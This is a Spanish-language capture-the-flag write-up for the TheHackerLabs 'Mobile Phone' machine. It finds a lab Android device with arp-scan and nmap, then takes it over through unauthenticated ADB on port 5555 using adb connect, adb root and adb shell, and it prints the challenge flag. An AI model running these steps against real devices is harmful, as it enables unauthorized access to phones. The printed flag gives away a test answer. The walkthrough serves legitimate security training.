---

title: "TheHackerLabs - Mobile Phone"
description: "Análisis de un dispositivo Android vulnerable mediante ADB sobre red local."
publishDate: 2024-07-07
category: "ctf"
type: "post"
difficulty: "easy"
tags: ["android", "adb", "nmap", "arp-scan", "root"]
readingTime: "5 min"

---

## Información del Challenge

* **Nombre**: Mobile Phone
* **CTF**: TheHackerLabs
* **Categoría**: Mobile / Principiante
* **Autores**: @CuriosidadesDeHackers y @condor7777
* **URL del reto**: [https://labs.thehackerslabs.com/machines/57](https://labs.thehackerslabs.com/machines/57)
* **Objetivo**: Obtener acceso al dispositivo Android objetivo y encontrar la flag

## Análisis técnico

El reto se centra en un dispositivo Android expuesto en red local con el puerto 5555 abierto, utilizado por el Android Debug Bridge (ADB). Esto permite potencialmente un acceso no autenticado si el servicio está mal configurado.

Herramientas clave:

* `arp-scan`: Para descubrir la IP del objetivo.
* `nmap`: Para escanear puertos y detectar el servicio ADB.
* `adb`: Para conectar remotamente y escalar privilegios en el dispositivo Android.

## Desarrollo de la solución

### Identificación de la IP con `arp-scan`

```bash
arp-scan -I eth0 --localnet
```

Resultado relevante:

```
172.18.0.135    00:0c:29:d3:30:83          VMware, Inc.
```

### Escaneo de puertos con `nmap`

```bash
nmap -p- --open --min-rate 2000 -sS -Pn -n -vvv 172.18.0.135 -oG allports_mobile
```

Puerto identificado:

```
5555/tcp open  adb
```

### Instalación de ADB

```bash
sudo apt install adb
sudo apt install google-android-platform-tools-installer
```

### Conexión con ADB

```bash
adb connect 172.18.0.135
```

Resultado:

```
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to 172.18.0.135:5555
```

### Escalada a root

```bash
adb root
```

### Shell en el sistema Android

```bash
adb shell
```

Navegación de sistema:

```bash
ls /
```

Listado parcial:

```
acct
cache
config
data
dev
etc
vendor
```

### Búsqueda de la flag

```bash
cd /data
ls
cat flag.txt
```

## Flag

```
THL{M0b1le_4ndro1d_3xp10it_5555}
```

## Lecciones aprendidas

* Dispositivos Android con ADB sobre red y sin autenticación son triviales de comprometer.
* El escaneo de red y puertos sigue siendo una técnica fundamental para la enumeración inicial.
* Conexión y uso de ADB requiere permisos root en muchos entornos, pero en entornos de pruebas puede estar deshabilitada la autenticación.

## Referencias

* [https://book.hacktricks.xyz/mobile-pentesting/android/android-debug-bridge](https://book.hacktricks.xyz/mobile-pentesting/android/android-debug-bridge)
* [https://developer.android.com/studio/command-line/adb](https://developer.android.com/studio/command-line/adb)
* [https://github.com/royhills/arp-scan](https://github.com/royhills/arp-scan)
* [https://nmap.org/](https://nmap.org/)
